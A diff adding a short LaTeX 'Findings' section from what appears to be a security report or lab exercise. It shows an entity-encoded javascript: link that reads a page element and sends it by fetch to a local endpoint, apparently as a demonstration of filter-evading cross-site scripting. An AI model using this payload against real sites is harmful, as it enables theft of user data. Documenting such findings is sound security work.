@@ -1,0 +1,9 @@
+\section{Findings}
+\label{sec:Findings}
+Combination of <a> with javascript in href injection, HTML ascii encoding, tagged template literals (line breaks for readability)
+\begin{lstlisting}
+<a href=j&#97v&#97script&#x3A;
+var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
+var&#32data&#32=&#32&#123body:secret,method:'POST'\};
+fetch`http:\//localhost:3001/api/ping?secret=$&#123data\}`>ClickMe</a>
+\end{lstlisting}
